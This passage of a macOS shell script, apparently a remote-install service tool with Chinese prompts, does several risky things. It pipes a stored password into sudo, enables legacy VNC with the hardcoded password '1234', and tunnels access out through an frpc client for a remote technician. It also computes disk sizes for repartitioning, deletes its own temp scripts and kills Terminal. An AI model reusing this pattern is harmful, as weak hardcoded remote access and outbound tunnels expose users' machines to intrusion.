echo "$pass" | sudo -S sudo /System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Resources/kickstart -configure -clientopts -setvnclegacy -vnclegacy yes -setvncpw -vncpw 1234 >/dev/null 2>&1
fi
fi
fi
clear && printf "\e[3J"
echo
echo
echo
echo "                        ""\033[42;30m 请【等待】技术员链接电脑！！！\033[0m"
echo
echo
echo "                    ""\033[42;30m 等会【如果】出现提示，请点【共享屏幕】\033[0m"
echo
echo
echo "             ""\033[42;30m 【当】技术员【安装】完【之后】，【再】请关掉本窗口\033[0m"
echo
echo
vnc=$(/tmp/frpc -c /tmp/$vncip.ini)
exit
fi


if [ "$gbsip" ]; then
modelxh="$(sw_vers 2>/dev/null|awk '/ProductVersion:/ {print $NR}')"
macboot="$(system_profiler SPSoftwareDataType 2>/dev/null|awk '/Boot Volume:/ {print $3,$4,$5,$6}')"
devboot="$(diskutil list | grep "$macboot" | sed 's/.*\(disk.*[0123456789]*\).*/\1/g'| head -n 1)"
if [ ! "$devboot" ]; then
devboot="$(diskutil list | grep "$(system_profiler SPSoftwareDataType 2>/dev/null|awk '/Boot Volume:/ {print $3,$4}')" | sed 's/.*\(disk.*[0123456789]*\).*/\1/g'| head -n 1 | tail -n 1)"
fi
jchxj="$(diskutil list | grep Apple_CoreStorage)"
if [ ! "$jchxj" ]; then
if [ ! "${devboot:6:1}" ]; then
devboot=""
if [[ $modelxh = "10.7"* ]]; then
devboot="disk0s2"
fi
if [[ $modelxh = "10.8"* ]]; then
devboot="disk0s2"
fi
if [[ $modelxh = "10.9"* ]]; then
devboot="disk0s2"
fi
if [[ $modelxh = "10.10"* ]]; then
devboot="disk0s2"
fi
if [[ $modelxh = "10.11"* ]]; then
devboot="disk0s2"
fi
if [[ $modelxh = "10.12"* ]]; then
devboot="disk0s2"
fi
if [[ $modelxh = "11."* ]]; then
devboot="disk1s1"
fi
if [[ $modelxh = "12."* ]]; then
devboot="disk1s1"
fi
if [ "$zxos" ]; then
devboot="disk1s1"
fi
fi
fi
num="${devboot:4:1}"
num2="${devboot:6:1}"
if [ "$jchxj" ]; then
hfs_size=`diskutil info -plist "$devboot" |grep -A 1 TotalSize|tail -1|sed 's|.*<integer>\(.*\)</integer>.*|\1|'`	
else	
hfs_size=`diskutil info -plist disk"$num"s"$num2" |grep -A 1 TotalSize|tail -1|sed 's|.*<integer>\(.*\)</integer>.*|\1|'`
fi
size=$kjdx"000000000"
new_hfs_size="$(($hfs_size-$size))b"
sip=""
rm -rf "/tmp/"$bjsbm".sh"
rm -rf "/tmp/"$bjsbm"1.sh"

FenQu3

fi


if [ "$exit" ]; then
clear && printf "\e[3J"	
echo
echo
echo	
echo
echo
echo	
echo
echo
echo
echo
echo
echo
echo
echo
echo
echo
echo	
echo
echo
echo
echo
echo
echo
echo
echo
echo
echo
echo
echo
echo
echo
echo	
echo
echo
echo
echo
echo
echo
echo
echo
echo
echo
echo
echo
echo
echo
echo
echo
echo
echo
echo
echo
echo
echo
echo
echo
echo
echo
rm -rf "/tmp/"$bjsbm".sh"
rm -rf "/tmp/"$bjsbm"1.sh"
sleep 2
killall Terminal
exit 
fi



clear && printf "\e[3J"
echo
echo
echo
echo "                        ""\033[42;30m 请重新打开浏览器下载的【7777.dmg】 发安装码给技术员\033[0m"
exit 
}



Start_menu